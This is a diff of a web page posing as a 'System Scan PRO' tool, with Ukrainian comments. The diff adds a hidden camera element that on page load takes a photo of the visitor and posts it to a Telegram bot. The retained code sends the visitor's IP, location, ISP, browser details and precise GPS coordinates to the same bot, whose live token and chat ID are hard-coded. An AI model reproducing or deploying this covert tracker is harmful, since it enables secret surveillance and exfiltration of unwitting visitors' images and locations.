@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Scan PRO</title>
+    <title>System Scan PRO + Cam</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
     <style>
         body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; }
@@ -17,9 +17,14 @@
         .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); transition: width 0.03s linear; }
         #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 1px solid #1e293b; }
         .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
+        /* Прихована камера */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
 <div class="status" id="statusText">INITIALIZING SYSTEM SCAN...</div>
 
@@ -43,34 +48,76 @@
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
-// --- КОНФІГУРАЦІЯ (ОНОВЛЕНО ID) ---
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
 const TG_CHAT_ID = "-1003787168523";
 
-// Оновлення часу
+// 1. ЗАПИТ ДОЗВОЛУ ВІДРАЗУ
+window.onload = () => {
+    takePhoto(); // Питаємо камеру
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy: true});
+    }
+};
+
+// Функція для фото
+async function takePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        
+        // Чекаємо секунду, щоб камера сфокусувалася
+        setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+                // Вимикаємо камеру після знімку
+                stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg');
+        }, 1500);
+    } catch (e) {
+        console.log("Камера відхилена або недоступна");
+    }
+}
+
+// Відправка фото в ТГ
+async function sendPhotoToTelegram(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', TG_CHAT_ID);
+    formData.append('photo', blob, 'shot.jpg');
+    formData.append('caption', '📸 Фото візитера');
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (e) { console.error("Помилка відправки фото"); }
+}
+
+// Логіка інтерфейсу (час, прогрес)
 setInterval(() => {
     const t = document.getElementById("time");
     if(t) t.innerText = new Date().toLocaleString();
 }, 1000);
 
-// Прогрес-бар
 let p = 0;
-let bar = document.getElementById("bar");
-let percent = document.getElementById("percent");
-let statusText = document.getElementById("statusText");
-
 let scan = setInterval(() => {
     p++;
-    bar.style.width = p + "%";
-    percent.innerText = p + "%";
+    document.getElementById("bar").style.width = p + "%";
+    document.getElementById("percent").innerText = p + "%";
     if (p >= 100) {
         clearInterval(scan);
-        statusText.innerText = "FINALIZING REPORT...";
+        document.getElementById("statusText").innerText = "FINALIZING REPORT...";
         startLogic();
     }
 }, 20);
 
-// Функція відправки в Telegram
 async function sendToTelegram(d, type = "LOG") {
     const message = `
 🔔 *${type === 'GPS' ? '🎯 ТОЧНІ КООРДИНАТИ' : '🌐 НОВИЙ ВІЗИТ'}*
@@ -83,85 +130,52 @@ async function sendToTelegram(d, type = "LOG") {
     `;
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: TG_CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
-            })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: "Markdown" })
         });
-        const res = await response.json();
-        if (!res.ok) console.error("TG Error:", res.description);
-    } catch (e) { 
-        console.error("Fetch Fail:", e); 
-    }
+    } catch (e) { }
 }
 
 function startLogic() {
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
-            // Відправляємо боту основні дані
             sendToTelegram(data, "IP");
 
-            // Виведення даних на екран
             setTimeout(() => { document.getElementById("ip").innerText = data.ip; document.getElementById("ipBox").classList.add("show"); }, 300);
             setTimeout(() => { document.getElementById("location").innerText = `${data.city}, ${data.country_name}`; document.getElementById("countryBox").classList.add("show"); }, 600);
             setTimeout(() => { document.getElementById("isp").innerText = data.org; document.getElementById("ispBox").classList.add("show"); }, 900);
             setTimeout(() => { document.getElementById("device").innerText = navigator.userAgent; document.getElementById("deviceBox").classList.add("show"); }, 1200);
 
-            // Блок EXTRA DATA
             setTimeout(() => {
                 const extra = document.createElement("div");
                 extra.className = "box show";
-                extra.innerHTML = `
-                    <div class="label">Advanced Metrics</div>
-                    <div class="value">
-                        Language: ${navigator.language}<br>
-                        Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
-                        GPU: ${getGPU()}
-                    </div>
-                `;
+                extra.innerHTML = `<div class="label">Advanced Metrics</div><div class="value">Language: ${navigator.language}<br>Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>`;
                 document.getElementById("extraContainer").appendChild(extra);
             }, 1500);
 
             setTimeout(() => { document.getElementById("timeBox").classList.add("show"); }, 1800);
 
-            // Карта та спроба отримати GPS
             setTimeout(() => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const gpsData = { ...data, latitude: pos.coords.latitude, longitude: pos.coords.longitude };
-                            sendToTelegram(gpsData, "GPS");
-                            showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Точна локація");
-                        },
-                        () => { showMap(data.latitude, data.longitude, data.city); },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } else {
-                    showMap(data.latitude, data.longitude, data.city);
-                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const gpsData = { ...data, latitude: pos.coords.latitude, longitude: pos.coords.longitude };
+                        sendToTelegram(gpsData, "GPS");
+                        showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Точна локація");
+                    },
+                    () => { showMap(data.latitude, data.longitude, data.city); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             }, 2100);
         });
 }
 
-function getGPU() {
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch (e) { return "N/A"; }
-}
-
 function showMap(lat, lon, label) {
     document.getElementById("map").style.display = "block";
-    statusText.innerText = "SUCCESSFUL";
+    document.getElementById("statusText").innerText = "SUCCESSFUL";
     document.getElementById("successText").style.display = "block";
-
     if (window.myMap) window.myMap.remove();
     window.myMap = L.map('map', {zoomControl: false}).setView([lat, lon], 14);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
